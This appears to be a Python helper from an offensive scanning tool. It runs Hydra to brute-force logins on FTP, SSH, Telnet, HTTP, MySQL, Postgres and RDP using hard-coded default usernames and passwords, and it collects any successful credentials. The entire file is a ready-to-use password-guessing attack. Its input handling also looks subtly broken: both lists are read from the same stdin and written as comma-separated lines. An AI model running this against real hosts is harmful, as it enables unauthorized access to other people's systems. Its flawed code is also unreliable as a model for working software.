import subprocess

# Services to brute-force per port
PORT_SERVICE_MAP = {
    21:   "ftp",
    22:   "ssh",
    23:   "telnet",
    80:   "http-get",
    3306: "mysql",
    5432: "postgres",
    3389: "rdp",
}

DEFAULT_USERS = "admin,root,user,administrator,test"
DEFAULT_PASS  = "admin,root,password,123456,test,toor"

def hydra_scan(target, open_ports):
    findings = []
    for port in open_ports:
        service = PORT_SERVICE_MAP.get(port)
        if not service:
            continue
        try:
            out = subprocess.check_output(
                ["hydra", "-L", f"/dev/stdin", "-P", f"/dev/stdin",
                 "-t", "4", "-f", "-u",
                 f"{target}", service, "-s", str(port)],
                input=f"{DEFAULT_USERS}\n{DEFAULT_PASS}",
                stderr=subprocess.DEVNULL, timeout=60, text=True
            )
            for line in out.splitlines():
                if "[" in line and "] login:" in line:
                    findings.append(line.strip())
        except subprocess.TimeoutExpired:
            print(f"[Hydra] Timeout on {target}:{port}")
        except Exception as e:
            print(f"[Hydra Error] {e}")
        if len(findings) >= 5:
            break
    return findings[:5]
